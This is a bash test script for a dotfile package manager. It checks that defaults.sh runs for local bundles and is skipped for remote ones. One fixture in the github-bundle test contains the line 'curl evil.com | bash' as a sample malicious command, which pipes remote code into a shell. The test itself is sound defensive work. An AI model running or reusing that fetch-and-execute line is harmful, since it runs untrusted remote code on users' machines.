#!/usr/bin/env bash
# tests/test_security.sh — Bundle security model: remote bundles cannot execute defaults.sh

set -euo pipefail

REPO="$(cd "$(dirname "$0")/.." && pwd)"

TEST_ROOT=$(mktemp -d)
export DOTPKG_HOME="$TEST_ROOT/.dotpkg"
export STATE_FILE="$DOTPKG_HOME/state.json"
export DOTFILES_DIR="$TEST_ROOT/dotfiles"
# shellcheck disable=SC2064
trap "rm -rf '$TEST_ROOT'" EXIT

mkdir -p "$DOTPKG_HOME/lib" "$DOTFILES_DIR/bundles"

# Copy libs
cp "$REPO/lib"/*.sh "$DOTPKG_HOME/lib/"

# Source all libs
# shellcheck disable=SC1090
. "$DOTPKG_HOME/lib/state.sh"
# shellcheck disable=SC1090
. "$DOTPKG_HOME/lib/prompt.sh"
# shellcheck disable=SC1090
. "$DOTPKG_HOME/lib/stow.sh"
# shellcheck disable=SC1090
. "$DOTPKG_HOME/lib/helpers.sh"
# shellcheck disable=SC1090
. "$DOTPKG_HOME/lib/bundle.sh"

state_init

# Mock brew to avoid real installs
brew() { :; }
export -f brew

# Harness
_PASS=0; _FAIL=0
_pass() { echo "PASS: $1"; _PASS=$((_PASS + 1)); }
_fail() { echo "FAIL: $1${2:+ — $2}"; _FAIL=$((_FAIL + 1)); }
assert_true()  { local d="$1"; shift; if "$@" 2>/dev/null; then _pass "$d"; else _fail "$d"; fi; }
assert_false() { local d="$1"; shift; if ! "$@" 2>/dev/null; then _pass "$d"; else _fail "$d"; fi; }
assert_eq()    { local d="$1" got="$2" want="$3"
                 [[ "$got" == "$want" ]] && { _pass "$d"; return; }
                 _fail "$d" "got='$got' want='$want'"; }

# ---------------------------------------------------------------------------
# Test: Local bundle defaults.sh IS executed
# ---------------------------------------------------------------------------

LOCAL_BUNDLE="$TEST_ROOT/local-bundle"
mkdir -p "$LOCAL_BUNDLE"
cat > "$LOCAL_BUNDLE/bundle.info" <<'EOF'
name=local-test
type=bundle
EOF

DEFAULTS_SENTINEL="$TEST_ROOT/defaults_executed"
cat > "$LOCAL_BUNDLE/defaults.sh" <<EOF
#!/bin/bash
echo "executed" > "$DEFAULTS_SENTINEL"
EOF

_DOTPKG_VISITED=""
install_bundle "$LOCAL_BUNDLE" "local" 2>/dev/null
assert_true "local bundle: defaults.sh executed" test -f "$DEFAULTS_SENTINEL"
rm -f "$DEFAULTS_SENTINEL"

# ---------------------------------------------------------------------------
# Test: Remote bundle (source) defaults.sh NOT executed
# ---------------------------------------------------------------------------

SOURCE_BUNDLE="$TEST_ROOT/source-bundle"
mkdir -p "$SOURCE_BUNDLE"
cat > "$SOURCE_BUNDLE/bundle.info" <<'EOF'
name=source-test
type=bundle
EOF

cat > "$SOURCE_BUNDLE/defaults.sh" <<EOF
#!/bin/bash
echo "SHOULD NOT EXECUTE" > "$DEFAULTS_SENTINEL"
EOF

_DOTPKG_VISITED=""
install_bundle "$SOURCE_BUNDLE" "source:user/repo" 2>/dev/null
assert_false "source bundle: defaults.sh NOT executed" test -f "$DEFAULTS_SENTINEL"

# Check that user was notified
INSTALL_OUTPUT="$TEST_ROOT/install_output"
_DOTPKG_VISITED=""
install_bundle "$SOURCE_BUNDLE" "source:user/repo" 2>"$INSTALL_OUTPUT" >/dev/null || true
assert_true "source bundle: skip message shown" grep -q "skipped.*remote bundle" "$INSTALL_OUTPUT"

# ---------------------------------------------------------------------------
# Test: Remote bundle (github) defaults.sh NOT executed
# ---------------------------------------------------------------------------

GITHUB_BUNDLE="$TEST_ROOT/github-bundle"
mkdir -p "$GITHUB_BUNDLE"
cat > "$GITHUB_BUNDLE/bundle.info" <<'EOF'
name=github-test
type=bundle
EOF

cat > "$GITHUB_BUNDLE/defaults.sh" <<EOF
#!/bin/bash
echo "MALICIOUS CODE" > "$DEFAULTS_SENTINEL"
curl evil.com | bash  # ponytail: example malicious command
EOF

_DOTPKG_VISITED=""
install_bundle "$GITHUB_BUNDLE" "github" 2>/dev/null
assert_false "github bundle: defaults.sh NOT executed" test -f "$DEFAULTS_SENTINEL"

# ---------------------------------------------------------------------------
# Test: Local bundle in bundles/ subdirectory IS executed
# ---------------------------------------------------------------------------

mkdir -p "$DOTFILES_DIR/bundles/local-sub"
cat > "$DOTFILES_DIR/bundles/local-sub/bundle.info" <<'EOF'
name=local-sub
type=bundle
EOF

cat > "$DOTFILES_DIR/bundles/local-sub/defaults.sh" <<EOF
#!/bin/bash
echo "local-sub-executed" > "$DEFAULTS_SENTINEL"
EOF

_DOTPKG_VISITED=""
install_bundle "$DOTFILES_DIR/bundles/local-sub" "local" 2>/dev/null
assert_true "local bundles/ subdir: defaults.sh executed" test -f "$DEFAULTS_SENTINEL"
content=$(cat "$DEFAULTS_SENTINEL")
assert_eq "local bundles/ subdir: correct execution" "$content" "local-sub-executed"

rm -f "$DEFAULTS_SENTINEL"

# ---------------------------------------------------------------------------
# Test: Bundle with no defaults.sh works for both local and remote
# ---------------------------------------------------------------------------

NO_DEFAULTS="$TEST_ROOT/no-defaults"
mkdir -p "$NO_DEFAULTS"
cat > "$NO_DEFAULTS/bundle.info" <<'EOF'
name=no-defaults-test
type=bundle
EOF

_DOTPKG_VISITED=""
assert_true "no defaults.sh: local bundle succeeds" install_bundle "$NO_DEFAULTS" "local"

_DOTPKG_VISITED=""
assert_true "no defaults.sh: remote bundle succeeds" install_bundle "$NO_DEFAULTS" "github"

# ---------------------------------------------------------------------------
# Test: Source field variations all skip defaults.sh
# ---------------------------------------------------------------------------

MULTI_SOURCE="$TEST_ROOT/multi-source"
mkdir -p "$MULTI_SOURCE"
cat > "$MULTI_SOURCE/bundle.info" <<'EOF'
name=multi-source-test
type=bundle
EOF

cat > "$MULTI_SOURCE/defaults.sh" <<EOF
#!/bin/bash
echo "executed-\$1" > "$DEFAULTS_SENTINEL"
EOF

for source in "source:org/repo" "github:user/repo" "github" "remote" "https://example.com/repo.git"; do
  rm -f "$DEFAULTS_SENTINEL"
  _DOTPKG_VISITED=""
  install_bundle "$MULTI_SOURCE" "$source" 2>/dev/null
  assert_false "source='$source': defaults.sh NOT executed" test -f "$DEFAULTS_SENTINEL"
done

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
echo ""
echo "Results: PASS=$_PASS FAIL=$_FAIL"
[[ $_FAIL -eq 0 ]]
